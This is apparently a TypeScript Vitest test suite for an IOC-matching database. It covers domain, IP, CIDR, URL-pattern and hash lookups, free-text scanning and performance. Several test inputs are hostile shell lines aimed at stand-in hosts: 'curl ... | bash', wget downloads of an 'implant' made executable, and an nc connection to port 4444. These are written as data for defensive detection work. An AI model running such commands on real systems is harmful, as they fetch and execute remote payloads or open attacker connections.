import { describe, expect, it } from "vitest";
import type { IOCEntry } from "./ioc-database.js";
import { IOCDatabase } from "./ioc-database.js";

// ---------------------------------------------------------------------------
// Helper to build a minimal custom IOCEntry
// ---------------------------------------------------------------------------

function makeEntry(overrides: Partial<IOCEntry> & { id: string; value: string }): IOCEntry {
  return {
    type: "domain",
    category: "malware",
    severity: "high",
    description: "test indicator",
    addedAt: new Date(),
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// Domain matching
// ---------------------------------------------------------------------------

describe("IOCDatabase – domain matching", () => {
  it("matches an exact known-bad domain", () => {
    const db = new IOCDatabase();
    const result = db.checkDomain("c2-server.example.net");
    expect(result).not.toBeNull();
    expect(result!.type).toBe("domain");
    expect(result!.category).toBe("c2");
    expect(result!.indicator).toBe("c2-server.example.net");
    expect(result!.matchedInput).toBe("c2-server.example.net");
  });

  it("matches a subdomain of a known-bad domain", () => {
    const db = new IOCDatabase();
    const result = db.checkDomain("staging.evil-payload.example.com");
    expect(result).not.toBeNull();
    expect(result!.indicator).toBe("evil-payload.example.com");
    expect(result!.matchedInput).toBe("staging.evil-payload.example.com");
  });

  it("matches deeply nested subdomains", () => {
    const db = new IOCDatabase();
    const result = db.checkDomain("a.b.c.dropper-stage1.example.net");
    expect(result).not.toBeNull();
    expect(result!.indicator).toBe("dropper-stage1.example.net");
  });

  it("is case-insensitive", () => {
    const db = new IOCDatabase();
    const result = db.checkDomain("C2-SERVER.EXAMPLE.NET");
    expect(result).not.toBeNull();
  });

  it("strips trailing dot from FQDN", () => {
    const db = new IOCDatabase();
    const result = db.checkDomain("c2-server.example.net.");
    expect(result).not.toBeNull();
  });

  it("returns null for a clean domain", () => {
    const db = new IOCDatabase();
    const result = db.checkDomain("safe.example.com");
    expect(result).toBeNull();
  });

  it("does not match a partial domain name that is not a subdomain", () => {
    const db = new IOCDatabase();
    // "notc2-server.example.net" should NOT match "c2-server.example.net"
    const result = db.checkDomain("notc2-server.example.net");
    expect(result).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// IP matching
// ---------------------------------------------------------------------------

describe("IOCDatabase – IP matching", () => {
  it("matches an exact known-bad IP", () => {
    const db = new IOCDatabase();
    const result = db.checkIP("192.0.2.1");
    expect(result).not.toBeNull();
    expect(result!.type).toBe("ip");
    expect(result!.indicator).toBe("192.0.2.1");
  });

  it("matches an IP within a known-bad CIDR range", () => {
    const db = new IOCDatabase();
    // 192.0.2.0/24 is in the seed data; 192.0.2.123 should match.
    const result = db.checkIP("192.0.2.123");
    expect(result).not.toBeNull();
    expect(result!.type).toBe("ip");
  });

  it("matches another CIDR range (198.51.100.0/24)", () => {
    const db = new IOCDatabase();
    const result = db.checkIP("198.51.100.77");
    expect(result).not.toBeNull();
  });

  it("matches 203.0.113.0/24 range", () => {
    const db = new IOCDatabase();
    const result = db.checkIP("203.0.113.55");
    expect(result).not.toBeNull();
  });

  it("returns null for a clean IP", () => {
    const db = new IOCDatabase();
    const result = db.checkIP("8.8.8.8");
    expect(result).toBeNull();
  });

  it("returns null for an invalid IP", () => {
    const db = new IOCDatabase();
    const result = db.checkIP("not-an-ip");
    expect(result).toBeNull();
  });

  it("prefers exact match over CIDR", () => {
    const db = new IOCDatabase();
    // 192.0.2.1 has both an exact entry and falls within 192.0.2.0/24.
    // The exact match should take precedence (returned first).
    const result = db.checkIP("192.0.2.1");
    expect(result).not.toBeNull();
    expect(result!.indicator).toBe("192.0.2.1");
  });
});

// ---------------------------------------------------------------------------
// URL checking
// ---------------------------------------------------------------------------

describe("IOCDatabase – URL checking", () => {
  it("matches a URL whose domain is in the IOC database", () => {
    const db = new IOCDatabase();
    const result = db.checkURL("https://evil-payload.example.com/malware.bin");
    expect(result).not.toBeNull();
    expect(result!.matchedInput).toBe("https://evil-payload.example.com/malware.bin");
    expect(result!.indicator).toBe("evil-payload.example.com");
  });

  it("matches a URL whose IP is in the IOC database", () => {
    const db = new IOCDatabase();
    const result = db.checkURL("http://192.0.2.1:8080/payload");
    expect(result).not.toBeNull();
  });

  it("matches a URL against a URL pattern (executable from raw IP)", () => {
    const db = new IOCDatabase();
    const result = db.checkURL("http://10.0.0.1/path/payload.exe");
    expect(result).not.toBeNull();
    expect(result!.type).toBe("url_pattern");
    expect(result!.category).toBe("malware");
  });

  it("matches a URL pattern for credential phishing", () => {
    const db = new IOCDatabase();
    const result = db.checkURL("https://login-secure.phish.test/page?user=victim");
    expect(result).not.toBeNull();
    expect(result!.category).toBe("phishing");
  });

  it("returns null for a clean URL", () => {
    const db = new IOCDatabase();
    const result = db.checkURL("https://www.google.com/search?q=hello");
    expect(result).toBeNull();
  });

  it("matches URL with embedded credentials (@ sign)", () => {
    const db = new IOCDatabase();
    const result = db.checkURL("https://admin:password@evil-site.example.com/panel");
    expect(result).not.toBeNull();
  });
});

// ---------------------------------------------------------------------------
// Hash checking
// ---------------------------------------------------------------------------

describe("IOCDatabase – hash checking", () => {
  it("matches a known-bad hash", () => {
    const db = new IOCDatabase();
    const result = db.checkHash("deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef");
    expect(result).not.toBeNull();
    expect(result!.type).toBe("hash");
    expect(result!.category).toBe("malware");
    expect(result!.severity).toBe("critical");
  });

  it("is case-insensitive for hashes", () => {
    const db = new IOCDatabase();
    const result = db.checkHash("DEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF");
    expect(result).not.toBeNull();
  });

  it("returns null for a clean hash", () => {
    const db = new IOCDatabase();
    const result = db.checkHash("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
    expect(result).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// Free-text scanning (check)
// ---------------------------------------------------------------------------

describe("IOCDatabase – free-text scanning", () => {
  it("finds a malicious domain in a curl command", () => {
    const db = new IOCDatabase();
    const matches = db.check("curl https://evil-payload.example.com/stage2.sh | bash");
    expect(matches.length).toBeGreaterThanOrEqual(1);
    expect(matches.some((m) => m.indicator === "evil-payload.example.com")).toBe(true);
  });

  it("finds a malicious IP in a wget command", () => {
    const db = new IOCDatabase();
    const matches = db.check("wget http://192.0.2.1:4444/implant -O /tmp/x");
    expect(matches.length).toBeGreaterThanOrEqual(1);
    expect(matches.some((m) => m.indicator === "192.0.2.1")).toBe(true);
  });

  it("finds multiple indicators in a single string", () => {
    const db = new IOCDatabase();
    const text = [
      "curl https://c2-server.example.net/beacon",
      "nc 198.51.100.1 4444",
      "sha256: deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
    ].join(" && ");

    const matches = db.check(text);
    expect(matches.length).toBeGreaterThanOrEqual(3);

    const indicators = matches.map((m) => m.indicator);
    expect(indicators).toContain("c2-server.example.net");
    expect(indicators).toContain("198.51.100.1");
    expect(indicators).toContain(
      "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
    );
  });

  it("deduplicates results when the same indicator appears multiple times", () => {
    const db = new IOCDatabase();
    const text = "ping 192.0.2.1 && ping 192.0.2.1 && ping 192.0.2.1";
    const matches = db.check(text);
    const ipMatches = matches.filter((m) => m.indicator === "192.0.2.1");
    expect(ipMatches.length).toBe(1);
  });

  it("returns an empty array for clean text", () => {
    const db = new IOCDatabase();
    const matches = db.check("echo 'Hello, world!'");
    expect(matches).toEqual([]);
  });

  it("finds a hash in free text", () => {
    const db = new IOCDatabase();
    const text = "File hash: cafebabecafebabecafebabecafebabecafebabecafebabecafebabecafebabe";
    const matches = db.check(text);
    expect(matches.some((m) => m.type === "hash")).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Adding and removing custom indicators
// ---------------------------------------------------------------------------

describe("IOCDatabase – add/remove indicators", () => {
  it("adds a custom domain indicator and matches it", () => {
    const db = new IOCDatabase();
    const custom = makeEntry({
      id: "custom-1",
      type: "domain",
      value: "new-evil-site.test",
    });

    expect(db.checkDomain("new-evil-site.test")).toBeNull();
    db.addIndicator(custom);
    expect(db.checkDomain("new-evil-site.test")).not.toBeNull();
  });

  it("adds a custom IP indicator", () => {
    const db = new IOCDatabase();
    const custom = makeEntry({
      id: "custom-ip-1",
      type: "ip",
      value: "10.99.99.99",
    });

    expect(db.checkIP("10.99.99.99")).toBeNull();
    db.addIndicator(custom);
    expect(db.checkIP("10.99.99.99")).not.toBeNull();
  });

  it("adds a custom CIDR range", () => {
    const db = new IOCDatabase();
    const custom = makeEntry({
      id: "custom-cidr-1",
      type: "ip",
      value: "10.10.0.0/16",
    });

    expect(db.checkIP("10.10.5.5")).toBeNull();
    db.addIndicator(custom);
    expect(db.checkIP("10.10.5.5")).not.toBeNull();
    expect(db.checkIP("10.11.5.5")).toBeNull();
  });

  it("adds a custom hash indicator", () => {
    const db = new IOCDatabase();
    const hash = "ff".repeat(32);
    const custom = makeEntry({
      id: "custom-hash-1",
      type: "hash",
      value: hash,
    });

    expect(db.checkHash(hash)).toBeNull();
    db.addIndicator(custom);
    expect(db.checkHash(hash)).not.toBeNull();
  });

  it("adds a custom URL pattern", () => {
    const db = new IOCDatabase();
    const custom = makeEntry({
      id: "custom-urlpat-1",
      type: "url_pattern",
      value: "https?://evil-custom\\.test/.*",
      category: "c2",
    });

    expect(db.checkURL("https://evil-custom.test/callback")).toBeNull();
    db.addIndicator(custom);
    expect(db.checkURL("https://evil-custom.test/callback")).not.toBeNull();
  });

  it("removes an indicator by ID", () => {
    const db = new IOCDatabase();
    const custom = makeEntry({
      id: "to-remove",
      type: "domain",
      value: "temporary-evil.test",
    });

    db.addIndicator(custom);
    expect(db.checkDomain("temporary-evil.test")).not.toBeNull();

    db.removeIndicator("to-remove");
    expect(db.checkDomain("temporary-evil.test")).toBeNull();
  });

  it("removes a CIDR range indicator", () => {
    const db = new IOCDatabase();
    const custom = makeEntry({
      id: "cidr-remove",
      type: "ip",
      value: "10.20.0.0/16",
    });

    db.addIndicator(custom);
    expect(db.checkIP("10.20.1.1")).not.toBeNull();

    db.removeIndicator("cidr-remove");
    expect(db.checkIP("10.20.1.1")).toBeNull();
  });

  it("removes a URL pattern indicator", () => {
    const db = new IOCDatabase();
    const custom = makeEntry({
      id: "urlpat-remove",
      type: "url_pattern",
      value: "https?://removeme\\.test/.*",
    });

    db.addIndicator(custom);
    expect(db.checkURL("https://removeme.test/path")).not.toBeNull();

    db.removeIndicator("urlpat-remove");
    expect(db.checkURL("https://removeme.test/path")).toBeNull();
  });

  it("replaces an existing indicator when adding with same ID", () => {
    const db = new IOCDatabase();
    const v1 = makeEntry({
      id: "replace-me",
      type: "domain",
      value: "old-domain.test",
    });
    const v2 = makeEntry({
      id: "replace-me",
      type: "domain",
      value: "new-domain.test",
    });

    db.addIndicator(v1);
    expect(db.checkDomain("old-domain.test")).not.toBeNull();

    db.addIndicator(v2);
    expect(db.checkDomain("old-domain.test")).toBeNull();
    expect(db.checkDomain("new-domain.test")).not.toBeNull();
  });

  it("removeIndicator is a no-op for unknown IDs", () => {
    const db = new IOCDatabase();
    const statsBefore = db.getStats();
    db.removeIndicator("nonexistent-id");
    const statsAfter = db.getStats();
    expect(statsAfter.totalIndicators).toBe(statsBefore.totalIndicators);
  });
});

// ---------------------------------------------------------------------------
// Stats reporting
// ---------------------------------------------------------------------------

describe("IOCDatabase – stats", () => {
  it("reports correct total indicator count", () => {
    const db = new IOCDatabase();
    const stats = db.getStats();
    // Seed data: ~50 domains + ~20 IPs + ~5 hashes + ~10 URL patterns = ~85
    expect(stats.totalIndicators).toBeGreaterThan(70);
  });

  it("reports indicators grouped by type", () => {
    const db = new IOCDatabase();
    const stats = db.getStats();
    expect(stats.byType["domain"]).toBeGreaterThanOrEqual(40);
    expect(stats.byType["ip"]).toBeGreaterThanOrEqual(15);
    expect(stats.byType["hash"]).toBeGreaterThanOrEqual(4);
    expect(stats.byType["url_pattern"]).toBeGreaterThanOrEqual(8);
  });

  it("reports indicators grouped by category", () => {
    const db = new IOCDatabase();
    const stats = db.getStats();
    expect(stats.byCategory["c2"]).toBeGreaterThan(0);
    expect(stats.byCategory["phishing"]).toBeGreaterThan(0);
    expect(stats.byCategory["malware"]).toBeGreaterThan(0);
    expect(stats.byCategory["cryptominer"]).toBeGreaterThan(0);
    expect(stats.byCategory["data_exfil"]).toBeGreaterThan(0);
  });

  it("has a lastUpdated Date", () => {
    const db = new IOCDatabase();
    const stats = db.getStats();
    expect(stats.lastUpdated).toBeInstanceOf(Date);
  });

  it("updates total after add/remove", () => {
    const db = new IOCDatabase();
    const before = db.getStats().totalIndicators;

    db.addIndicator(makeEntry({ id: "stat-test-1", type: "domain", value: "stat-test.test" }));
    expect(db.getStats().totalIndicators).toBe(before + 1);

    db.removeIndicator("stat-test-1");
    expect(db.getStats().totalIndicators).toBe(before);
  });
});

// ---------------------------------------------------------------------------
// Empty database (skipSeedData)
// ---------------------------------------------------------------------------

describe("IOCDatabase – skipSeedData option", () => {
  it("creates an empty database when skipSeedData is true", () => {
    const db = new IOCDatabase({ skipSeedData: true });
    const stats = db.getStats();
    expect(stats.totalIndicators).toBe(0);
  });

  it("allows adding indicators to an empty database", () => {
    const db = new IOCDatabase({ skipSeedData: true });
    db.addIndicator(makeEntry({ id: "empty-1", type: "domain", value: "lonely.test" }));
    expect(db.checkDomain("lonely.test")).not.toBeNull();
    expect(db.getStats().totalIndicators).toBe(1);
  });
});

// ---------------------------------------------------------------------------
// Performance benchmark
// ---------------------------------------------------------------------------

describe("IOCDatabase – performance", () => {
  it("completes 1000 domain lookups in under 50ms", () => {
    const db = new IOCDatabase();
    const domains = [
      "c2-server.example.net",
      "evil-payload.example.com",
      "safe-domain.com",
      "google.com",
      "sub.dropper-stage1.example.net",
    ];

    const start = performance.now();
    for (let i = 0; i < 1000; i++) {
      db.checkDomain(domains[i % domains.length]);
    }
    const elapsed = performance.now() - start;
    expect(elapsed).toBeLessThan(50);
  });

  it("completes 1000 IP lookups in under 50ms", () => {
    const db = new IOCDatabase();
    const ips = ["192.0.2.1", "198.51.100.77", "8.8.8.8", "203.0.113.42", "1.2.3.4"];

    const start = performance.now();
    for (let i = 0; i < 1000; i++) {
      db.checkIP(ips[i % ips.length]);
    }
    const elapsed = performance.now() - start;
    expect(elapsed).toBeLessThan(50);
  });

  it("completes 1000 hash lookups in under 50ms", () => {
    const db = new IOCDatabase();
    const hashes = [
      "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
      "cafebabecafebabecafebabecafebabecafebabecafebabecafebabecafebabe",
    ];

    const start = performance.now();
    for (let i = 0; i < 1000; i++) {
      db.checkHash(hashes[i % hashes.length]);
    }
    const elapsed = performance.now() - start;
    expect(elapsed).toBeLessThan(50);
  });

  it("completes 1000 URL checks in under 50ms", () => {
    const db = new IOCDatabase();
    const urls = [
      "https://evil-payload.example.com/stage2.sh",
      "https://www.google.com/search?q=hello",
      "http://192.0.2.1:8080/callback",
      "https://safe.example.org/page",
    ];

    const start = performance.now();
    for (let i = 0; i < 1000; i++) {
      db.checkURL(urls[i % urls.length]);
    }
    const elapsed = performance.now() - start;
    expect(elapsed).toBeLessThan(50);
  });

  it("completes 1000 free-text scans in under 200ms", () => {
    const db = new IOCDatabase();
    const texts = [
      "curl https://evil-payload.example.com/shell.sh | bash",
      "echo hello world",
      "wget http://192.0.2.1/implant && chmod +x implant",
      "git push origin main",
    ];

    const start = performance.now();
    for (let i = 0; i < 1000; i++) {
      db.check(texts[i % texts.length]);
    }
    const elapsed = performance.now() - start;
    expect(elapsed).toBeLessThan(200);
  });
});
